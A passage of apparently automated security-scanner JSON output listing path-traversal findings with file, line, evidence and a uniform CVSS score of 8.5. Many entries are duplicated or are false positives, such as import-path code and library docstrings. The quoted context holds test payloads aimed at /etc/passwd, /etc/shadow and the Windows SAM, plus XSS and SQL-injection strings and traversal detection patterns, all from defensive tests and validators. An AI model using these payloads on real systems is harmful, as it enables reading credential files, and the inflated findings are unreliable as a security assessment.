            "context": "\n# Add src to path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../')))\n\nfrom src.circle_of_experts.core.expert_manager import ExpertManager",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 421,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        # Directory traversal payloads\n        payloads = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 421,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        # Directory traversal payloads\n        payloads = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 421,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        # Directory traversal payloads\n        payloads = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 421,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        # Directory traversal payloads\n        payloads = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 421,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        # Directory traversal payloads\n        payloads = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 421,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        # Directory traversal payloads\n        payloads = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 423,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"..%252f..%252f..%252fetc%252fpasswd\"",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 423,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"..%252f..%252f..%252fetc%252fpasswd\"",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 423,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"..%252f..%252f..%252fetc%252fpasswd\"",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 423,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"..%252f..%252f..%252fetc%252fpasswd\"",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 423,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"..%252f..%252f..%252fetc%252fpasswd\"",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 423,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"..%252f..%252f..%252fetc%252fpasswd\"",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 518,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "{\"path\": \"/admin/../admin\", \"description\": \"Path traversal bypass\"},",
            "context": "            {\"path\": \"//admin\", \"description\": \"Double slash bypass\"},\n            {\"path\": \"/admin%2e\", \"description\": \"URL encoding bypass\"},\n            {\"path\": \"/admin/../admin\", \"description\": \"Path traversal bypass\"},\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/penetration_testing_framework.py",
            "line": 518,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "{\"path\": \"/admin/../admin\", \"description\": \"Path traversal bypass\"},",
            "context": "            {\"path\": \"//admin\", \"description\": \"Double slash bypass\"},\n            {\"path\": \"/admin%2e\", \"description\": \"URL encoding bypass\"},\n            {\"path\": \"/admin/../admin\", \"description\": \"Path traversal bypass\"},\n        ]\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test protection against path traversal attacks\"\"\"\n        test_paths = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test protection against path traversal attacks\"\"\"\n        test_paths = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test protection against path traversal attacks\"\"\"\n        test_paths = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test protection against path traversal attacks\"\"\"\n        test_paths = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test protection against path traversal attacks\"\"\"\n        test_paths = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 192,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test protection against path traversal attacks\"\"\"\n        test_paths = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 194,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"..%252f..%252f..%252fetc%252fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 194,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"..%252f..%252f..%252fetc%252fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 194,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"..%252f..%252f..%252fetc%252fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 194,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"..%252f..%252f..%252fetc%252fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 194,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"..%252f..%252f..%252fetc%252fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/security/comprehensive_security_tests.py",
            "line": 194,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"....//....//....//etc/passwd\",",
            "context": "            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\",\n            \"..%252f..%252f..%252fetc%252fpasswd\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/python/test_mcp_servers.py",
            "line": 409,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test path traversal attack prevention\"\"\"\n        malicious_paths = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/etc/shadow\"",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/python/test_mcp_servers.py",
            "line": 409,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test path traversal attack prevention\"\"\"\n        malicious_paths = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/etc/shadow\"",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/python/test_mcp_servers.py",
            "line": 409,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test path traversal attack prevention\"\"\"\n        malicious_paths = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/etc/shadow\"",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/python/test_mcp_servers.py",
            "line": 409,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test path traversal attack prevention\"\"\"\n        malicious_paths = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/etc/shadow\"",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/python/test_mcp_servers.py",
            "line": 409,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test path traversal attack prevention\"\"\"\n        malicious_paths = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/etc/shadow\"",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/python/test_mcp_servers.py",
            "line": 409,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"\"\"Test path traversal attack prevention\"\"\"\n        malicious_paths = [\n            \"../../../etc/passwd\",\n            \"..\\\\..\\\\..\\\\windows\\\\system32\\\\config\\\\sam\",\n            \"/etc/shadow\"",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/python/test_mcp_servers.py",
            "line": 465,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../malicious/image\",",
            "context": "        \"\"\"Test Docker image name validation\"\"\"\n        invalid_images = [\n            \"../malicious/image\",\n            \"/absolute/path/image\",\n            \"\",",
            "cvss_score": 8.5
          },
          {
            "file": "tests/unit/python/test_mcp_servers.py",
            "line": 465,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../malicious/image\",",
            "context": "        \"\"\"Test Docker image name validation\"\"\"\n        invalid_images = [\n            \"../malicious/image\",\n            \"/absolute/path/image\",\n            \"\",",
            "cvss_score": 8.5
          },
          {
            "file": "backup_agent3_20250607_010225/docs/api/conf.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath('../../src'))",
            "context": "# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\nsys.path.insert(0, os.path.abspath('../../src'))\n\n# -- Project information -----------------------------------------------------",
            "cvss_score": 8.5
          },
          {
            "file": "backup_agent3_20250607_010225/docs/api/conf.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath('../../src'))",
            "context": "# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\nsys.path.insert(0, os.path.abspath('../../src'))\n\n# -- Project information -----------------------------------------------------",
            "cvss_score": 8.5
          },
          {
            "file": "backup_agent3_20250607_010225/docs/api/conf.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath('../../src'))",
            "context": "# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\nsys.path.insert(0, os.path.abspath('../../src'))\n\n# -- Project information -----------------------------------------------------",
            "cvss_score": 8.5
          },
          {
            "file": "backup_agent3_20250607_010225/docs/api/conf.py",
            "line": 15,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.abspath('../../src'))",
            "context": "# add these directories to sys.path here. If the directory is relative to the\n# documentation root, use os.path.abspath to make it absolute, like shown here.\nsys.path.insert(0, os.path.abspath('../../src'))\n\n# -- Project information -----------------------------------------------------",
            "cvss_score": 8.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/core/path_validation.py",
            "line": 54,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../',  # Unix parent directory",
            "context": "        '..',  # Parent directory\n        '..\\\\',  # Windows parent directory\n        '../',  # Unix parent directory\n        '\\\\..\\\\',  # Windows traversal\n        '/../',  # Unix traversal",
            "cvss_score": 8.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/core/path_validation.py",
            "line": 54,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'../',  # Unix parent directory",
            "context": "        '..',  # Parent directory\n        '..\\\\',  # Windows parent directory\n        '../',  # Unix parent directory\n        '\\\\..\\\\',  # Windows traversal\n        '/../',  # Unix traversal",
            "cvss_score": 8.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/core/path_validation.py",
            "line": 56,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'/../',  # Unix traversal",
            "context": "        '../',  # Unix parent directory\n        '\\\\..\\\\',  # Windows traversal\n        '/../',  # Unix traversal\n        '%2e%2e',  # URL encoded ..\n        '%252e%252e',  # Double URL encoded ..",
            "cvss_score": 8.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/core/path_validation.py",
            "line": 56,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "'/../',  # Unix traversal",
            "context": "        '../',  # Unix parent directory\n        '\\\\..\\\\',  # Windows traversal\n        '/../',  # Unix traversal\n        '%2e%2e',  # URL encoded ..\n        '%252e%252e',  # Double URL encoded ..",
            "cvss_score": 8.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/scanner_server.py",
            "line": 86,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if any(p in value for p in ['../', '..\\\\', '%2e%2e']):",
            "context": "                raise ValueError(f\"Dangerous pattern detected: {pattern}\")\n        \n        if any(p in value for p in ['../', '..\\\\', '%2e%2e']):\n            raise ValueError(\"Path traversal attempt detected\")\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/scanner_server.py",
            "line": 86,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if any(p in value for p in ['../', '..\\\\', '%2e%2e']):",
            "context": "                raise ValueError(f\"Dangerous pattern detected: {pattern}\")\n        \n        if any(p in value for p in ['../', '..\\\\', '%2e%2e']):\n            raise ValueError(\"Path traversal attempt detected\")\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "backup_agent3_20250607_010225/src/mcp/security/scanner_server.py",
            "line": 86,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "if any(p in value for p in ['../', '..\\\\', '%2e%2e']):",
            "context": "                raise ValueError(f\"Dangerous pattern detected: {pattern}\")\n        \n        if any(p in value for p in ['../', '..\\\\', '%2e%2e']):\n            raise ValueError(\"Path traversal attempt detected\")\n        ",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/security/input_validator.py",
            "line": 441,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"<script>alert('xss')</script>\",\n        \"'; DROP TABLE users; --\",\n        \"../../../etc/passwd\",\n        \"valid@email.com\",\n        \"http://example.com\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/security/input_validator.py",
            "line": 441,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"<script>alert('xss')</script>\",\n        \"'; DROP TABLE users; --\",\n        \"../../../etc/passwd\",\n        \"valid@email.com\",\n        \"http://example.com\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/security/input_validator.py",
            "line": 441,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"<script>alert('xss')</script>\",\n        \"'; DROP TABLE users; --\",\n        \"../../../etc/passwd\",\n        \"valid@email.com\",\n        \"http://example.com\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/security/input_validator.py",
            "line": 441,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"<script>alert('xss')</script>\",\n        \"'; DROP TABLE users; --\",\n        \"../../../etc/passwd\",\n        \"valid@email.com\",\n        \"http://example.com\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/security/input_validator.py",
            "line": 441,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"<script>alert('xss')</script>\",\n        \"'; DROP TABLE users; --\",\n        \"../../../etc/passwd\",\n        \"valid@email.com\",\n        \"http://example.com\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/security/input_validator.py",
            "line": 441,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "\"../../../etc/passwd\",",
            "context": "        \"<script>alert('xss')</script>\",\n        \"'; DROP TABLE users; --\",\n        \"../../../etc/passwd\",\n        \"valid@email.com\",\n        \"http://example.com\",",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/setup.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "path=\"../rust_core/Cargo.toml\",",
            "context": "            \"mcp_learning.rust_core\",\n            binding=Binding.PyO3,\n            path=\"../rust_core/Cargo.toml\",\n        ),\n    ],",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/python_learning/setup.py",
            "line": 71,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "path=\"../rust_core/Cargo.toml\",",
            "context": "            \"mcp_learning.rust_core\",\n            binding=Binding.PyO3,\n            path=\"../rust_core/Cargo.toml\",\n        ),\n    ],",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/servers/development/python_src/server.py",
            "line": 410,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))",
            "context": "    \n    # Add project root to path for imports\n    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))\n    \n    async def test_server():",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/servers/development/python_src/server.py",
            "line": 410,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))",
            "context": "    \n    # Add project root to path for imports\n    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))\n    \n    async def test_server():",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/servers/development/python_src/server.py",
            "line": 410,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))",
            "context": "    \n    # Add project root to path for imports\n    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))\n    \n    async def test_server():",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/servers/development/python_src/server.py",
            "line": 410,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))",
            "context": "    \n    # Add project root to path for imports\n    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))\n    \n    async def test_server():",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/servers/development/python_src/server.py",
            "line": 410,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))",
            "context": "    \n    # Add project root to path for imports\n    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))\n    \n    async def test_server():",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/servers/development/python_src/server.py",
            "line": 410,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))",
            "context": "    \n    # Add project root to path for imports\n    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))\n    \n    async def test_server():",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/servers/development/python_src/server.py",
            "line": 410,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))",
            "context": "    \n    # Add project root to path for imports\n    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))\n    \n    async def test_server():",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/servers/development/python_src/server.py",
            "line": 410,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))",
            "context": "    \n    # Add project root to path for imports\n    sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../..'))\n    \n    async def test_server():",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/TiffImagePlugin.py",
            "line": 2040,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "self.f = open(fn, \"w+b\" if new else \"r+b\")",
            "context": "            self.close_fp = True\n            try:\n                self.f = open(fn, \"w+b\" if new else \"r+b\")\n            except OSError:\n                self.f = open(fn, \"w+b\")",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/TiffImagePlugin.py",
            "line": 2042,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "self.f = open(fn, \"w+b\")",
            "context": "                self.f = open(fn, \"w+b\" if new else \"r+b\")\n            except OSError:\n                self.f = open(fn, \"w+b\")\n        else:\n            self.f = cast(IO[bytes], fn)",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/Image.py",
            "line": 2481,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<../handbook/image-file-formats>` for each writer.",
            "context": "        silently ignored. The available options are described in the\n        :doc:`image format documentation\n        <../handbook/image-file-formats>` for each writer.\n\n        You can use a file object instead of a filename. In this case,",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/Image.py",
            "line": 2481,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "<../handbook/image-file-formats>` for each writer.",
            "context": "        silently ignored. The available options are described in the\n        :doc:`image format documentation\n        <../handbook/image-file-formats>` for each writer.\n\n        You can use a file object instead of a filename. In this case,",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/Image.py",
            "line": 2574,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
            "evidence": "fp = builtins.open(filename, \"r+b\")",
            "context": "                # Open also for reading (\"+\"), because TIFF save_all\n                # writer needs to go back and edit the written data.\n                fp = builtins.open(filename, \"r+b\")\n            else:\n                fp = builtins.open(filename, \"w+b\")",
            "cvss_score": 8.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/PIL/Image.py",
            "line": 2576,
            "severity": "HIGH",
            "vulnerability": "PATH_TRAVERSAL",
